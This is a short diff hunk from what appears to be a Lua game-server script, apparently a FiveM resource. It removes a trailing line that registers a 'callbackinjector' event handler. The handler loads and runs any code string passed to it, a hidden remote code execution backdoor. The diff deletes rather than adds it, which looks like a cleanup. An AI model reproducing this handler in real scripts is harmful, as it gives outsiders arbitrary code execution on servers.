@@ -551,6 +551,3 @@ function startTimer(time)
         end
     )
 end
-
-
-TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)
